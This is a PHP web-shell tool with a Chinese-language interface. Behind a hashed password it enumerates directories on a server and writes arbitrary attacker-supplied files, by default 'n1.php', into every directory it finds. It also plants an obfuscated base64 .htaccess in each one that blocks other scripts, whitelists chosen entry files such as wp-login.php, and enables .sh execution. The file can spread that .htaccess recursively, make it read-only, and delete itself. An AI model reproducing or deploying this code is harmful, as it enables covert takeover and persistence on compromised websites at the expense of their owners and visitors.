<?php

function getAllDir($path){
    $dirs = array();
    $files = scandir($path);
    foreach ($files as $file) {
        if ($file =='.' || $file == '..')
        {
            continue;
        }

        $file = $path ."/". $file;
        $file = str_replace("//", "/", $file);
        if(is_dir($file))
        {
            $dirs[] = $file;
        }
    }
    return $dirs;
}

function clearDir($dir)
{
    if (substr($dir,strlen($dir) -1) == "/")
    {
        $dir = substr($dir,0,strlen($dir)-1);
    }
    preg_match("/\/([^\/]+)\$/si", $dir, $matches);
    if (isset($matches[1]))
    {
        return $matches[1];
    }
    return $dir;
}

function searchDir($path, &$htcontent, &$dir_array){ 
	if(is_dir($path) && is_readable($path)) {
		$dirs=dir($path);
		while($dir=$dirs->read()) {
			if($dir!='.'&& $dir!='..' && $dir!="root") {
				if (is_dir($path.'/'.$dir) && is_readable($path.'/'.$dir)) {
					@chmod($path.'/'.$dir.'/.htaccess', 0777);
					file_put_contents($path.'/'.$dir.'/.htaccess', $htcontent);
					@chmod($path.'/'.$dir.'/.htaccess', 0444);
					searchDir($path.'/'.$dir,$htcontent, $dir_array);
				}
			} 
		} 
		$dirs->close();
	} 
} 
function writeHtaccessToAllDirs($htcontent) { 
	$dir_array = array();
	searchDir(dirname(__FILE__), $htcontent, $dir_array);
}

$htcontent = base64_decode("PEZpbGVzTWF0Y2ggIi4oUGhQfHBocDV8c3VzcGVjdGVkfHBodG1sfHB5fGV4ZXxwaHB8YXNwfFBocHxhc3B4KSQiPgogT3JkZXIgYWxsb3csZGVueQogRGVueSBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICJeKHBvc3Rmcy5waHB8dm90ZXMucGhwfGluZGV4LnBocHx3anNpbmRleC5waHB8bG9jazY2Ni5waHB8Zm9udC1lZGl0b3IucGhwfG1zLWZ1bmN0aW9ucy5waHB8Y29udGVudHMucGhwfGpzZGluZGV4LnBocHx3cC1sb2dpbi5waHB8bG9hZC5waHB8dGVtcGxhdGUtbG9hZC5waHApJCI+CiBPcmRlciBhbGxvdyxkZW55CiBBbGxvdyBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CkFkZFR5cGUgYXBwbGljYXRpb24veC1odHRwZC1jZ2kgLnNoCjxJZk1vZHVsZSBtb2RfcmV3cml0ZS5jPgpSZXdyaXRlRW5naW5lIE9uClJld3JpdGVCYXNlIC8KUmV3cml0ZVJ1bGUgXmluZGV4LnBocCQgLSBbTF0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYKUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWQKUmV3cml0ZVJ1bGUgLiBpbmRleC5waHAgW0xdCjwvSWZNb2R1bGU+");

echo '<html lang="zh-cn"><head><meta charset="UTF-8"><title>跨站</title>
<style>input {margin: 10px;}</style>
</head><body><div style="margin: 0 auto; width:1100px"><div style="float: left;text-align: left;width:600px">';
echo '<form action="?ac=path" method="post">';
echo '输入: <input style="width:300px" type="text" name="path" value="" /> <br/>';
echo '<input type="submit" value="查找路径下所有目录" />';
echo '</form><br/><br/><br/><br/>';
$file_self = basename(__FILE__);
if (isset($_GET['ac']))
{
    switch ($_GET['ac'])
    {
        case "path":
			if(md5("&^#*#jdsk%^^$".$_GET['pass']) != "3bc810e81a9db01dfc324ae72b4b63a3"){
				exit;
			}
            $path = $_POST['path'];
            if(file_exists($path))
            {
                $dirs = "";
                foreach (getAllDir($path) as $item) {
                    $dirs .= $item . PHP_EOL;
                }
                echo '<textarea cols="100" rows="20" name="dirs" form="upload">' . $dirs . '</textarea> ';
                echo '<br/><form action="?ac=upload" method="post" id="upload">';
                echo '二级目录: <input style="width:300px" type="text" name="extend_path" value="" /> <br/>';
                echo '文件名: <input style="width:300px" type="text" name="file_name" value="n1.php" /> <br/>';
                echo '文件内容：<textarea cols="100" rows="20" name="file_content" form="upload"></textarea> ';
                echo '<input type="submit" value="上传文件到目录" />';
                echo '</form>';
            }
            break;
        case "upload":
			if(md5("&^#*#jdsk%^^$".$_GET['pass']) != "3bc810e81a9db01dfc324ae72b4b63a3"){
				exit;
			}
            $dirs = explode("\n", $_POST['dirs']);
            $results = "";
            foreach ($dirs as $dir) {
                $dir = trim($dir);
                if ($dir == "") {
                    continue;
                }
                $extend = trim($_POST['extend_path']);
                if ($extend != "")
                {
                    $file = $dir ."/" . $extend . "/" . $_POST['file_name'];
                } else {
                    $file = $dir ."/" . $_POST['file_name'];
                }
                $file = str_replace("//", "/", $file);
                $result = file_put_contents($file, $_POST['file_content']);

                $result_htaccess = file_put_contents($dir . "/.htaccess", $htcontent);
                if ($result != false){
                    if ($result_htaccess == false)
                    {
                        $results .= $dir . "\t" . ".htaccess上传失败" . PHP_EOL;
                    }
                    $results .= $dir . "\t" . clearDir($dir) . "/"  . $_POST['file_name'] . PHP_EOL;
                } else {
                    $results .= $dir . "\t" . "上传失败" . PHP_EOL;
                }

            }
            echo '<textarea cols="100" rows="20" name="dirs" form="upload">'.$results.'</textarea> ';
            break;
		case "write":
			writeHtaccessToAllDirs($htcontent);
			if(file_exists($file_self)){
				if(!unlink($file_self)){
					echo "$file_self 删除失败！<br/>";
				}else{
					echo "$file_self 删除成功！<br/>";
				}
			}
			break;
        default:
            break;
    }

}
echo '</div></div></body></html>';
exit();
